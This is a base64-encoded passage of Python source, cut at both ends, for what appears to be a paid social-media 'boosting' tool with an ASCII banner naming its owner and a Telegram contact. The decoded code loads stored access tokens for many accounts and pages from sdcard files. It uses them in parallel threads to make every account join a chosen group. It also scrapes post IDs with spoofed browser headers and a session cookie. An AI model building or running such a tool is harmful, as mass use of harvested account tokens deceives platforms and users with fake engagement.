zZWQgb24gdXNlciBpbnB1dCBmb3IgZmlsZSBjaG9pY2UsIGdyb3VwIElELCBhbmQgbnVtYmVyIG9mIHRva2Vucy4iIiIKICAgIAogICAgY2xlYXJfc2NyZWVuKCkKICAgIGpvdmFuKCkKICAgIGZpbGVfb3B0aW9ucyA9IHsKICAgICAgICAxOiAiL3NkY2FyZC9ib29zdHBoZXJlL0ZSQUFDQ09VTlQudHh0IiwKICAgICAgICAyOiAiL3NkY2FyZC9ib29zdHBoZXJlL0ZSQVBBR0VTLnR4dCIsCiAgICAgICAgMzogIi9zZGNhcmQvYm9vc3RwaGVyZS9SUFdBQ0NPVU5ULnR4dCIsCiAgICAgICAgNDogIi9zZGNhcmQvYm9vc3RwaGVyZS9SUFdQQUdFUy50eHQiCiAgICB9CiAgICAKICAgICMgRGlzcGxheSB0aGUgYXZhaWxhYmxlIGZpbGUgb3B0aW9ucwogICAgcHJpbnQoZiIiIiAgICAgXDAzM1sxOzM3bUNIT09TRSBUWVBFIE9GIEFDQ09VTlRTIFRPIEpPSU4gR1JPVVA6IAogICAgIFwwMzNbMTszNG1bMV0gXDAzM1sxOzMybUZSQSBBQ0NPVU5UIAogICAgIFwwMzNbMTszNG1bMl0gXDAzM1sxOzMybUZSQSBQQUdFUwogICAgIFwwMzNbMTszNG1bM10gXDAzM1sxOzMybVJQVyBBQ0NPVU5UCiAgICAgXDAzM1sxOzM0bVs0XSBcMDMzWzE7MzJtUlBXIFBBR0VTCiAgICAgXDAzM1sxOzMxbVswXSBcMDMzWzE7MzFtRVhJVCAKICAgIFwwMzNbMTszMW3ilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIBcMDMzWzBtIiIiKQoKICAgIHRyeToKICAgICAgICBmaWxlX2Nob2ljZSA9IGludChpbnB1dCgiICAgXDAzM1sxOzMybUNob29zZTogIikpCiAgICAgICAgcHJpbnQoZiIgICAge2JsdWV94pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSAXDAzM1swbSIpCiAgICAgICAgaWYgZmlsZV9jaG9pY2Ugbm90IGluIGZpbGVfb3B0aW9uczoKICAgICAgICAgICAgcHJpbnQoIkludmFsaWQgY2hvaWNlLiIpCiAgICAgICAgICAgIHJldHVybgogICAgICAgIGZpbGVfcGF0aCA9IGZpbGVfb3B0aW9uc1tmaWxlX2Nob2ljZV0KICAgIGV4Y2VwdCBWYWx1ZUVycm9yOgogICAgICAgIHByaW50KCJQbGVhc2UgZW50ZXIgYSB2YWxpZCBudW1iZXIuIikKICAgICAgICByZXR1cm4KCiAgICAjIFN0ZXAgMjogTG9hZCB0aGUgdG9rZW5zIGZyb20gdGhlIHNlbGVjdGVkIGZpbGUKICAgIHRyeToKICAgICAgICB3aXRoIG9wZW4oZmlsZV9wYXRoLCAncicpIGFzIGZpbGU6CiAgICAgICAgICAgIHRva2VucyA9IFtsaW5lLnN0cmlwKCkgZm9yIGxpbmUgaW4gZmlsZS5yZWFkbGluZXMoKSBpZiBsaW5lLnN0cmlwKCldICAjIEVuc3VyZSBubyBlbXB0eSBsaW5lcwogICAgZXhjZXB0IEZpbGVOb3RGb3VuZEVycm9yOgogICAgICAgIHByaW50KCJGaWxlIG5vdCBmb3VuZC4iKQogICAgICAgIHJldHVybgogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgIHByaW50KGYiRXJyb3IgbG9hZGluZyB0b2tlbnM6IHtlfSIpCiAgICAgICAgcmV0dXJuCgogICAgYXZhaWxhYmxlX3Rva2VucyA9IGxlbih0b2tlbnMpCgogICAgIyBTdGVwIDM6IEFzayB0aGUgdXNlciBmb3IgdGhlIHN0YXJ0aW5nIGxpbmUKICAgIGlmIGF2YWlsYWJsZV90b2tlbnMgPT0gMDoKICAgICAgICBwcmludCgiTm8gdG9rZW5zIGF2YWlsYWJsZSBmcm9tIHRoZSBzZWxlY3RlZCBmaWxlLiIpCiAgICAgICAgcmV0dXJuCgogICAgdHJ5OgogICAgICAgIHN0YXJ0X2xpbmUgPSBpbnQoaW5wdXQoZiIgICBcMDMzWzE7MzJtRW50ZXIgdGhlIHN0YXJ0aW5nIGxpbmUgKDEgdG8ge2F2YWlsYWJsZV90b2tlbnN9KTogIikpCiAgICAgICAgcHJpbnQoZiIgICAge3JlZH3ilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIBcMDMzWzBtIikKICAgICAgICBpZiBzdGFydF9saW5lIDwgMSBvciBzdGFydF9saW5lID4gYXZhaWxhYmxlX3Rva2VuczoKICAgICAgICAgICAgcHJpbnQoZiJQbGVhc2UgZW50ZXIgYSB2YWxpZCBsaW5lIG51bWJlciBiZXR3ZWVuIDEgYW5kIHthdmFpbGFibGVfdG9rZW5zfS4iKQogICAgICAgICAgICByZXR1cm4KICAgIGV4Y2VwdCBWYWx1ZUVycm9yOgogICAgICAgIHByaW50KCJQbGVhc2UgZW50ZXIgYSB2YWxpZCBudW1iZXIuIikKICAgICAgICByZXR1cm4KCiAgICB0b2tlbnMgPSB0b2tlbnNbc3RhcnRfbGluZSAtIDE6XQoKICAgICMgU3RlcCA0OiBBc2sgdGhlIHVzZXIgZm9yIHRoZSBncm91cCBJRAogICAgZ3JvdXBfaWQgPSBpbnB1dChmIiAgIHt5ZWxsb3d9WzE7MzJtRW50ZXIgdGhlIGdyb3VwIElEOiAiKQogICAgcHJpbnQoZiIgICAge3JlZH3ilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIBcMDMzWzBtIikKCiAgICAjIFN0ZXAgNTogQXNrIHRoZSB1c2VyIGZvciB0aGUgbnVtYmVyIG9mIHRva2VucyB0byBwcm9jZXNzCiAgICB0cnk6CiAgICAgICAgbnVtX3Rva2VucyA9IGludChpbnB1dChmIiAgIFwwMzNbMTszMm1FbnRlciBMaW1pdDogIikpCiAgICAgICAgcHJpbnQoZiIgICAge3JlZH3ilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIBcMDMzWzBtIikKICAgIGV4Y2VwdCBWYWx1ZUVycm9yOgogICAgICAgIHByaW50KCJQbGVhc2UgZW50ZXIgYSB2YWxpZCBudW1iZXIgZm9yIHRva2Vucy4iKQogICAgICAgIHJldHVybgoKICAgICMgU3RlcCA2OiBDaGVjayBpZiB0aGUgcmVxdWVzdGVkIG51bWJlciBvZiB0b2tlbnMgZXhjZWVkcyB0aGUgYXZhaWxhYmxlIHRva2VucwogICAgaWYgbnVtX3Rva2VucyA+IGxlbih0b2tlbnMpOgogICAgICAgIHByaW50KGYiXDAzM1sxOzMxbUVSUk9SOiBOdW1iZXIgZXhjZWVkcyBhdmFpbGFibGUgdG9rZW5zICh7bGVuKHRva2Vucyl9KS4iKQogICAgICAgIHByaW50KGYiICAgIHtibHVlfeKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgFwwMzNbMG0iKQogICAgICAgIHJldHVybgoKICAgICMgU3RlcCA3OiBKb2luIHRoZSBncm91cCB1c2luZyBtdWx0aXRocmVhZGluZyBhbmQgZHluYW1pYyBwcm9maWxlIElEIHJldHJpZXZhbAogICAgam9pbl9jb3VudCA9IDAKICAgIGZhaWxlZF9jb3VudCA9IDAKICAgIHJldHJpZXNfbGVmdCA9IG51bV90b2tlbnMgICMgVGhlIG51bWJlciBvZiByZXRyaWVzIGxlZnQgdG8gcGVyZm9ybQogICAgbWF4X3dvcmtlcnMgPSAxMCAgIyBTZXQgbWF4aW11bSBudW1iZXIgb2YgdGhyZWFkcwogICAgcmVzdWx0cyA9IFtdCgogICAgd2l0aCBUaHJlYWRQb29sRXhlY3V0b3IobWF4X3dvcmtlcnM9bWF4X3dvcmtlcnMpIGFzIGV4ZWN1dG9yOgogICAgICAgIGZ1dHVyZV90b190b2tlbiA9IHt9CiAgICAgICAgCiAgICAgICAgIyBBdHRlbXB0IHRvIGpvaW4gdGhlIGdyb3VwIGZvciB0aGUgc3BlY2lmaWVkIG51bWJlciBvZiB0b2tlbnMKICAgICAgICB3aGlsZSBqb2luX2NvdW50IDwgbnVtX3Rva2VucyBhbmQgcmV0cmllc19sZWZ0ID4gMDoKICAgICAgICAgICAgZm9yIHRva2VuIGluIHRva2Vuc1s6cmV0cmllc19sZWZ0XToKICAgICAgICAgICAgICAgIGFjY2Vzc190b2tlbiA9IHRva2VuLnNwbGl0KCd8JylbMV0KICAgICAgICAgICAgICAgIHByb2ZpbGVfaWQgPSBnZXRfcHJvZmlsZV9pZChhY2Nlc3NfdG9rZW4pCiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIGlmIHByb2ZpbGVfaWQ6CiAgICAgICAgICAgICAgICAgICAgZnV0dXJlID0gZXhlY3V0b3Iuc3VibWl0KGpvaW5fZ3JvdXAsIGdyb3VwX2lkLCBwcm9maWxlX2lkLCBhY2Nlc3NfdG9rZW4pCiAgICAgICAgICAgICAgICAgICAgZnV0dXJlX3RvX3Rva2VuW2Z1dHVyZV0gPSB0b2tlbgogICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICBwcmludChmIlwwMzNbMTszMW1bRkFJTEVEXSBcMDMzWzE7MzdtRmFpbGVkIHRvIHJldHJpZXZlIHByb2ZpbGUgSUQgZm9yIHRva2VuIFwwMzNbMTszM217dG9rZW59XDAzM1swbSIpCgogICAgICAgICAgICAjIFByb2Nlc3MgdGhlIHJlc3VsdHMgb2YgdGhlIGpvaW5zCiAgICAgICAgICAgIGZvciBmdXR1cmUgaW4gYXNfY29tcGxldGVkKGZ1dHVyZV90b190b2tlbik6CiAgICAgICAgICAgICAgICB0b2tlbiA9IGZ1dHVyZV90b190b2tlbltmdXR1cmVdCiAgICAgICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICAgICAgc3VjY2VzcyA9IGZ1dHVyZS5yZXN1bHQoKQogICAgICAgICAgICAgICAgICAgIGlmIHN1Y2Nlc3M6CiAgICAgICAgICAgICAgICAgICAgICAgIGpvaW5fY291bnQgKz0gMQogICAgICAgICAgICAgICAgICAgICAgICBwcmludChmIlwwMzNbMTszMm1bU1VDQ0VTU10gXDAzM1sxOzM3bVN1Y2Nlc3NmdWxseSBqb2luZWQgZ3JvdXAge2dyb3VwX2lkfSIpCiAgICAgICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICAgICAgZmFpbGVkX2NvdW50ICs9IDEKICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQoZiJ7cmVkfVtVTlNVQ0NFU1NdIFwwMzNbMTtGQUlMRUQgam9pbmVkIGdyb3VwIHtncm91cF9pZH0iKQogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICMgU3RvcCByZXRyeWluZyBpZiB3ZSd2ZSByZWFjaGVkIHRoZSBzdWNjZXNzIGxpbWl0CiAgICAgICAgICAgICAgICAgICAgaWYgam9pbl9jb3VudCA+PSBudW1fdG9rZW5zOgogICAgICAgICAgICAgICAgICAgICAgICBicmVhawogICAgICAgICAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgICAgICAgICAgICAgIHByaW50KGYiRXJyb3IgcHJvY2Vzc2luZyB0b2tlbiB7dG9rZW59OiB7ZX0iKQoKICAgICAgICAgICAgCiAgICAgICAgICAgIHJldHJpZXNfbGVmdCA9IG51bV90b2tlbnMgLSBqb2luX2NvdW50CgogICAgICAgIHByaW50KCJcMDMzWzE7MzFt4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSAXDAzM1swbSIpCiAgICAgICAgcHJpbnQoZiJcMDMzWzE7MzJtVE9UQUwgU1VDQ0VTU0ZVTDoge2pvaW5fY291bnR9XDAzM1swbSIpCiAgICAgICAgcHJpbnQoZiJcMDMzWzE7MzFtVE9UQUwgRkFJTEVEOiB7ZmFpbGVkX2NvdW50fVwwMzNbMG0iKQpkZWYgbGl2ZSh1cmwpOgogICAgIyBTcGxpdCB0aGUgVVJMIGJ5IHNsYXNoZXMKICAgIHBhcnRzID0gdXJsLnNwbGl0KCcvJykKICAgIAogICAgIyBFbnN1cmUgdGhhdCB0aGUgVVJMIGhhcyBlbm91Z2ggcGFydHMKICAgIGlmIGxlbihwYXJ0cykgPiA0OgogICAgICAgIHVzZXJfaWQgPSBwYXJ0c1szXSAgIyBUaGUgdXNlci9wYWdlIElECiAgICAgICAgdmlkZW9faWQgPSBwYXJ0c1s1XSAgIyBUaGUgdmlkZW8gSUQKICAgICAgICAKICAgICAgICAjIENvbWJpbmUgdGhlbSB3aXRoIGFuIHVuZGVyc2NvcmUKICAgICAgICByZXR1cm4gZiJ7dXNlcl9pZH1fe3ZpZGVvX2lkfSIKICAgIGVsc2U6CiAgICAgICAgcmV0dXJuIE5vbmUgICMgUmV0dXJuIE5vbmUgaWYgdGhlIFVSTCBmb3JtYXQgaXMgdW5leHBlY3RlZAppbXBvcnQgb3MKaW1wb3J0IHJlcXVlc3RzCmltcG9ydCB1dWlkCmltcG9ydCByYW5kb20KZnJvbSByZXF1ZXN0cyBpbXBvcnQgcG9zdCBhcyBwdApmcm9tIHJpY2ggaW1wb3J0IHByaW50IGFzIHJwCmZyb20gcmljaC5wYW5lbCBpbXBvcnQgUGFuZWwgYXMgcGFuCgppbXBvcnQgb3MKaW1wb3J0IHJlcXVlc3RzCmltcG9ydCB1dWlkCmltcG9ydCByYW5kb20KZnJvbSByZXF1ZXN0cyBpbXBvcnQgcG9zdCBhcyBwdApmcm9tIHJpY2ggaW1wb3J0IHByaW50IGFzIHJwCmZyb20gcmljaC5wYW5lbCBpbXBvcnQgUGFuZWwgYXMgcGFuCmltcG9ydCBwbGF0Zm9ybQppbXBvcnQgb3MKaW1wb3J0IHJhbmRvbQppbXBvcnQgdXVpZApkYXJrYmx1ZSA9ICJcMDMzWzM0bSIKZ3JlZW4gPSAiXDAzM1sxOzMybSIKcmVkID0gIlwwMzNbMTszMW0iCnllbGxvdyA9ICJcMDMzWzE7MzNtIgpza3libHVlID0gIlwwMzNbMTszNm0iCmJsdWUgPSAiXDAzM1sxOzM0bSIKbGlnaHRibHVlID0gIlwwMzNbMzg7NTs4MW0iCndoaXRlID0gIlwwMzNbMTszN20iClIgPSAiXDAzM1szMW0iICAjIFJlZApHID0gIlwwMzNbMzJtIiAgIyBHcmVlbgpZID0gIlwwMzNbMzNtIiAgIyBZZWxsb3cKQiA9ICJcMDMzWzM0bSIgICMgQmx1ZQpNID0gIlwwMzNbMzVtIiAgIyBNYWdlbnRhClAgPSAiXDAzM1szNm0iICAjIEN5YW4KQyA9ICJcMDMzWzM3bSIgICMgV2hpdGUKZGVmIGNsZWFyX3NjcmVlbigpOgogICAgaWYgJ3Rlcm11eCcgaW4gcGxhdGZvcm0uc3lzdGVtKCkubG93ZXIoKToKICAgICAgICBvcy5zeXN0ZW0oJ2NsZWFyJykKICAgIGVsaWYgcGxhdGZvcm0uc3lzdGVtKCkubG93ZXIoKSA9PSAnd2luZG93cyc6CiAgICAgICAgb3Muc3lzdGVtKCdjbHMnKQogICAgZWxzZToKICAgICAgICBvcy5zeXN0ZW0oJ2NsZWFyJykKaW1wb3J0IHJlcXVlc3RzCmltcG9ydCB0aHJlYWRpbmcKZnJvbSBjb25jdXJyZW50LmZ1dHVyZXMgaW1wb3J0IFRocmVhZFBvb2xFeGVjdXRvcgppbXBvcnQgcmFuZG9tCmltcG9ydCB0aW1lCmltcG9ydCBzeXMKaW1wb3J0IG9zCmltcG9ydCBwbGF0Zm9ybQppbXBvcnQgcmUKcHVycGxlID0gIlwwMzNbMTszNW0iCmJsdWUgPSAiXDAzM1szNG0iCmdyZWVuID0gIlwwMzNbMTszMm0iCnJlZCA9ICJcMDMzWzE7MzFtIgp5ZWxsb3cgPSAiXDAzM1sxOzMzbSIKd2hpdGUgPSAiXDAzM1sxOzM3bSIKZGVmIGpvdmFuKCk6CiAgICBhZHJreiA9ICJcMDMzWzM0bSAiCmRlZiBqb3ZhbigpOgogICAgYWRya3ogPSAiXDAzM1szNG0gIgogICAgcHJpbnQoZiIiIgogICAge3JlZH0gCntibHVlfeKVreKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKVrgp7Ymx1ZX3ilIIgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB7Ymx1ZX0gICAgIOKUggp7Ymx1ZX3ilIIge2hvdHBpbmt9ICAgICAgIOKWkeKWiOKWiOKWiOKWiOKWiOKVl+KWkeKWiOKWiOKWiOKVl+KWkeKWkeKWiOKWiOKVl+KWiOKWiOKWiOKVl+KWkeKWkeKWiOKWiOKVl+KWiOKWiOKVl+KWiOKWiOKVl+KWkeKWkeKWiOKWiOKVl+KWiOKWiOKVl+KWkeKWkeKWiOKWiOKVl+KWiOKWiOKVl+KWkeKWkeKWkeKWiOKWiOKVl3tibHVlfSAgICAgICAgICAgIOKUggp7Ymx1ZX3ilIIgIHtob3RwaW5rfSAgICAgIOKWiOKWiOKVlOKVkOKVkOKWiOKWiOKVl+KWiOKWiOKWiOKWiOKVl+KWkeKWiOKWiOKVkeKWiOKWiOKWiOKWiOKVl+KWkeKWiOKWiOKVkeKWiOKWiOKVkeKVmuKWiOKWiOKVl+KWiOKWiOKVlOKVneKVmuKWiOKWiOKVl+KWiOKWiOKVlOKVneKVmuKWiOKWiOKVl+KWkeKWiOKWiOKVlOKVnSB7Ymx1ZX0gICAgICAgICAgIOKUggp7Ymx1ZX3ilIIgIHtob3RwaW5rfSAgICAgIOKWiOKWiOKWiOKWiOKWiOKWiOKWiOKVkeKWiOKWiOKVlOKWiOKWiOKVl+KWiOKWiOKVkeKWiOKWiOKVlOKWiOKWiOKVl+KWiOKWiOKVkeKWiOKWiOKVkeKWkeKVmuKWiOKWiOKWiOKVlOKVneKWkeKWkeKVmuKWiOKWiOKWiOKVlOKVneKWkeKWkeKVmuKWiOKWiOKWiOKWiOKVlOKVneKWkSB7Ymx1ZX0gICAgICAgICAgIOKUggp7Ymx1ZX3ilIIge2hvdHBpbmt9ICAgICAgIOKWiOKWiOKVlOKVkOKVkOKWiOKWiOKVkeKWiOKWiOKVkeKVmuKWiOKWiOKWiOKWiOKVkeKWiOKWiOKVkeKVmuKWiOKWiOKWiOKWiOKVkeKWiOKWiOKVkeKWkeKWiOKWiOKVlOKWiOKWiOKVl+KWkeKWkeKWiOKWiOKVlOKWiOKWiOKVl+KWkeKWkeKWkeKVmuKWiOKWiOKVlOKVneKWkeKWkSB7Ymx1ZX0gICAgICAgICAgIOKUggp7Ymx1ZX3ilIIgIHtob3RwaW5rfSAgICAgIOKWiOKWiOKVkeKWkeKWkeKWiOKWiOKVkeKWiOKWiOKVkeKWkeKVmuKWiOKWiOKWiOKVkeKWiOKWiOKVkeKWkeKVmuKWiOKWiOKWiOKVkeKWiOKWiOKVkeKWiOKWiOKVlOKVneKVmuKWiOKWiOKVl+KWiOKWiOKVlOKVneKVmuKWiOKWiOKVl+KWkeKWkeKWkeKWiOKWiOKVkeKWkeKWkeKWkXtibHVlfSAgICAgICAgICAgIOKUggp7Ymx1ZX3ilIIgICB7aG90cGlua30gICAgIOKVmuKVkOKVneKWkeKWkeKVmuKVkOKVneKVmuKVkOKVneKWkeKWkeKVmuKVkOKVkOKVneKVmuKVkOKVneKWkeKWkeKVmuKVkOKVkOKVneKVmuKVkOKVneKVmuKVkOKVneKWkeKWkeKVmuKVkOKVneKVmuKVkOKVneKWkeKWkeKVmuKVkOKVneKWkeKWkeKWkeKVmuKVkOKVneKWkeKWkeKWkXtibHVlfSAgICAgICAgICAgIOKUggp7Ymx1ZX3ilIIgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHtibHVlfSAgICAgICAgIOKUggp7Ymx1ZX3ilbDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIB7Q30gRCBFIFYgRSBMIE8gUCBFIFIgIEcgTCBJIFQgQyBIIEIgWSBBIE4gTiBFIHtibHVlfeKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKVrwog4pWt4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSAe0N9VE9PTCBJTkZPUk1BVElPTntCfeKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKVriB7Ymx1ZX0gICDila3ilIDilIDilIDilIDilIDilIDilIDilIB7Q31VU0VSIElORk9STUFUSU9Oe0J94pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pWuCiDilIIge3JlZH3igKJ7aG90cGlua30gT1dORVIgICA6IHtncmVlbn1HbGFpemVsIEFubmUgICAge2JsdWV9ICAgIOKUgiAgIHtibHVlfSDilIIge3JlZH3igKIge2hvdHBpbmt9U1RBVFVTICAgOiB7Z3JlZW59QUNUSVZFICAgICAgICB7Ymx1ZX0gICAgIOKUggog4pSCe3JlZH0g4oCiIHtob3RwaW5rfVVTRVMgICAgOiB7Z3JlZW59Qk9PU1RJTkcgICAgICAge2JsdWV9ICAgICDilIIge2JsdWV9ICAg4pSCIHtyZWR94oCiIHtob3RwaW5rfUNPVU5UUlkgIDp7Z3JlZW59IFBISUxJUFBJTkVTICAgIHtibHVlfSAgICDilIIKIOKUgntyZWR9IOKAoiB7aG90cGlua31ORVRXT1JLIDoge2dyZWVufUFMTCBORVRXT1JLICAgICB7Ymx1ZX0gICAg4pSCICAge2JsdWV9IOKUgiB7cmVkfeKAoiB7aG90cGlua31URUxFR1JBTSA6IHtncmVlbn1Ac2V2aTAyICAgICAgICAge2JsdWV9ICDilIIKIOKUgiB7cmVkfeKAoiB7aG90cGlua31WRVJTSU9OIDoge2dyZWVufTUuMCAgICAgIHtibHVlfSAgICAgICAgICAg4pSCe2JsdWV9ICAgIOKUgiB7cmVkfeKAoiB7aG90cGlua31UT09MUyAgICA6IHtncmVlbn1QQUlERUQgICAgICAge2JsdWV9ICAgICAg4pSCCiDilbDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDila8gICAg4pWw4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pWvIiIiKQpwdXJwbGUgPSAiXDAzM1sxOzM1bSIKYmx1ZSA9ICJcMDMzWzM0bSIKZ3JlZW4gPSAiXDAzM1sxOzMybSIKcmVkID0gIlwwMzNbMTszMW0iCnllbGxvdyA9ICJcMDMzWzE7MzNtIgp3aGl0ZSA9ICJcMDMzWzE7MzdtIgppbXBvcnQgcmFuZG9tCmltcG9ydCBzdHJpbmcKZGVmIGdldF9jb21iaW5lZF9kYXRhKHVybCk6CiAgICAiIiIKICAgIEZldGNoIHRoZSByZXNwb25zZSBmcm9tIHRoZSBnaXZlbiBVUkwgYW5kIGV4dHJhY3QgdGhlIGBhY3Ryc2AgbnVtYmVyIGFuZCBgcG9zdF9pZGAuCiAgICBDb21iaW5lIHRoZXNlIHZhbHVlcyBhbmQgcmV0dXJuIHRoZSByZXN1bHQuCgogICAgQXJnczoKICAgICAgICB1cmwgKHN0cik6IFRoZSBVUkwgdG8gZmV0Y2ggZGF0YSBmcm9tLgoKICAgIFJldHVybnM6CiAgICAgICAgc3RyOiBUaGUgY29tYmluZWQgc3RyaW5nIG9mIGBhY3Ryc2AgbnVtYmVyIGFuZCBgcG9zdF9pZGAsIG9yIGFuIGVycm9yIG1lc3NhZ2UuCiAgICAiIiIKICAgIGhlYWRlcnMgPSB7CiAgICAgICAgJ1VzZXItQWdlbnQnOiAiTW96aWxsYS81LjAgKFgxMTsgTGludXggeDg2XzY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTMxLjAuMC4wIFNhZmFyaS81MzcuMzYiLAogICAgICAgICdBY2NlcHQnOiAidGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLGltYWdlL2FwbmcsKi8qO3E9MC44LGFwcGxpY2F0aW9uL3NpZ25lZC1leGNoYW5nZTt2PWIzO3E9MC43IiwKICAgICAgICAnY2FjaGUtY29udHJvbCc6ICJtYXgtYWdlPTAiLAogICAgICAgICdkcHInOiAiMiIsCiAgICAgICAgJ3ZpZXdwb3J0LXdpZHRoJzogIjk4MCIsCiAgICAgICAgJ3NlYy1jaC11YSc6ICJcIkdvb2dsZSBDaHJvbWVcIjt2PVwiMTMxXCIsIFwiQ2hyb21pdW1cIjt2PVwiMTMxXCIsIFwiTm90X0EgQnJhbmRcIjt2PVwiMjRcIiIsCiAgICAgICAgJ3NlYy1jaC11YS1tb2JpbGUnOiAiPzAiLAogICAgICAgICdzZWMtY2gtdWEtcGxhdGZvcm0nOiAiXCJMaW51eFwiIiwKICAgICAgICAnc2VjLWNoLXVhLXBsYXRmb3JtLXZlcnNpb24nOiAiXCJcIiIsCiAgICAgICAgJ3NlYy1jaC11YS1tb2RlbCc6ICJcIlwiIiwKICAgICAgICAnc2VjLWNoLXVhLWZ1bGwtdmVyc2lvbi1saXN0JzogIlwiR29vZ2xlIENocm9tZVwiO3Y9XCIxMzEuMC42Nzc4LjEwNFwiLCBcIkNocm9taXVtXCI7dj1cIjEzMS4wLjY3NzguMTA0XCIsIFwiTm90X0EgQnJhbmRcIjt2PVwiMjQuMC4wLjBcIiIsCiAgICAgICAgJ3NlYy1jaC1wcmVmZXJzLWNvbG9yLXNjaGVtZSc6ICJsaWdodCIsCiAgICAgICAgJ3VwZ3JhZGUtaW5zZWN1cmUtcmVxdWVzdHMnOiAiMSIsCiAgICAgICAgJ3NlYy1mZXRjaC1zaXRlJzogInNhbWUtb3JpZ2luIiwKICAgICAgICAnc2VjLWZldGNoLW1vZGUnOiAibmF2aWdhdGUiLAogICAgICAgICdzZWMtZmV0Y2gtdXNlcic6ICI/MSIsCiAgICAgICAgJ3NlYy1mZXRjaC1kZXN0JzogImRvY3VtZW50IiwKICAgICAgICAnYWNjZXB0LWxhbmd1YWdlJzogImVuLVVTLGVuO3E9MC45IiwKICAgICAgICAncHJpb3JpdHknOiAidT0wLCBpIiwKICAgICAgICAnQ29va2llJzogInNiPWZ1WlRaOFp5bDlkWGo1VE